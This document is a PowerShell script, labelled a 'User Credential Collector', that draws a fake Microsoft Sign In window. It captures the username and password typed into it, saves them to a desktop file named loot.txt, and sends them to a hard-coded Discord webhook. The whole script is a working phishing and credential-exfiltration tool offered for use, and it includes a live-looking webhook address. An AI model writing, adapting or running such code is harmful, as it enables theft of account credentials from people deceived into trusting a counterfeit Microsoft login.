# User Credential Collector
# Description: A utility script emulating the look of Microsoft Sign-In.

# Load necessary libraries
Add-Type -AssemblyName PresentationFramework

# Create a window
$window = New-Object System.Windows.Window
$window.Title = "Microsoft Sign In"
$window.Width = 420
$window.Height = 400
$window.WindowStartupLocation = [System.Windows.WindowStartupLocation]::CenterScreen
$window.Background = [System.Windows.Media.Brushes]::White
$window.ResizeMode = 'NoResize'

# Create Grid
$grid = New-Object System.Windows.Controls.Grid
$window.Content = $grid

# Microsoft Logo (Placeholder using TextBlock; ideally, you'd use an Image element)
$logo = New-Object System.Windows.Controls.TextBlock
$logo.Text = "Microsoft"
$logo.FontSize = 28
$logo.FontWeight = "Bold"
$logo.HorizontalAlignment = "Center"
$logo.VerticalAlignment = "Top"
$logo.Margin = "0,20,0,0"
$grid.AddChild($logo)

# Sign-in Label
$signInLabel = New-Object System.Windows.Controls.Label
$signInLabel.Content = "Sign in"
$signInLabel.FontSize = 16
$signInLabel.HorizontalAlignment = "Left"
$signInLabel.VerticalAlignment = "Top"
$signInLabel.Margin = "50,75,0,0"
$grid.AddChild($signInLabel)

# Username Label
$usernameLabel = New-Object System.Windows.Controls.Label
$usernameLabel.Content = "Email, phone, or Skype"
$usernameLabel.HorizontalAlignment = "Left"
$usernameLabel.VerticalAlignment = "Top"
$usernameLabel.Margin = "50,105,0,0"
$grid.AddChild($usernameLabel)

# Username TextBox
$usernameBox = New-Object System.Windows.Controls.TextBox
$usernameBox.Width = 300
$usernameBox.Height = 30
$usernameBox.HorizontalAlignment = "Left"
$usernameBox.VerticalAlignment = "Top"
$usernameBox.Margin = "50,130,0,0"
$grid.AddChild($usernameBox)

# Password Label
$passwordLabel = New-Object System.Windows.Controls.Label
$passwordLabel.Content = "Password"
$passwordLabel.HorizontalAlignment = "Left"
$passwordLabel.VerticalAlignment = "Top"
$passwordLabel.Margin = "50,180,0,0"
$grid.AddChild($passwordLabel)

# Password TextBox (masked for security)
$passwordBox = New-Object System.Windows.Controls.PasswordBox
$passwordBox.Width = 300
$passwordBox.Height = 30
$passwordBox.HorizontalAlignment = "Left"
$passwordBox.VerticalAlignment = "Top"
$passwordBox.Margin = "50,205,0,0"
$grid.AddChild($passwordBox)

# Submit Button
$button = New-Object System.Windows.Controls.Button
$button.Content = "Submit"
$button.Width = 300
$button.Height = 40
$button.HorizontalAlignment = "Left"
$button.VerticalAlignment = "Top"
$button.Margin = "50,255,0,0"
$button.Background = [System.Windows.Media.Brushes]::RoyalBlue
$button.Foreground = [System.Windows.Media.Brushes]::White
$button.Add_Click({
    $global:username = $usernameBox.Text
    $global:password = $passwordBox.Password
    $window.Close()
})
$grid.AddChild($button)

# Forgot password link
$forgotPasswordButton = New-Object System.Windows.Controls.Button
$forgotPasswordButton.Content = "Forgot your password?"
$forgotPasswordButton.Background = [System.Windows.Media.Brushes]::Transparent
$forgotPasswordButton.BorderThickness = '0'
$forgotPasswordButton.HorizontalAlignment = "Left"
$forgotPasswordButton.VerticalAlignment = "Top"
$forgotPasswordButton.Margin = "50,305,0,0"
$forgotPasswordButton.Foreground = [System.Windows.Media.Brushes]::RoyalBlue
$forgotPasswordButton.Cursor = "Hand"
$forgotPasswordButton.Add_Click({
    Start-Process "https://account.live.com/ResetPassword.aspx"
})
$grid.AddChild($forgotPasswordButton)

# Display the window
$window.ShowDialog()

# ... (rest of your script above)

# Save credentials to a text file on the desktop named loot.txt
"Username: $global:username `r`nPassword: $global:password" | Out-File "$env:USERPROFILE\Desktop\loot.txt"

try {
    # Send the credentials to Discord webhook
    $webhookUrl = 'https://discord.com/api/webhooks/1153646407476051978/SrG-zO85AIbihBzLpQhCkoz9rSQPSwWJnc-FHNqqYK2wC0hcEfs8txmwWMTlkROZBwGK'
    $data = Get-Content -Path "$env:USERPROFILE\Desktop\loot.txt"
    $dataString = $data -join "`n"
    $bodyContent = @{
        'content' = $dataString.Substring(0, [Math]::Min(1999, $dataString.Length))
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $bodyContent -ContentType 'application/json'
    
    # Optionally, you can delete loot.txt after sending to Discord if you wish for cleaner operation
    # Remove-Item "$env:USERPROFILE\Desktop\loot.txt"
}
catch {
    $_ | Out-File "$env:USERPROFILE\Desktop\error_log.txt"
    Write-Host "An error occurred. Check error_log.txt for details."
}

# Pause before exit
Read-Host "Press Enter to exit..."


# Pause before exit
Read-Host "Press Enter to exit..."
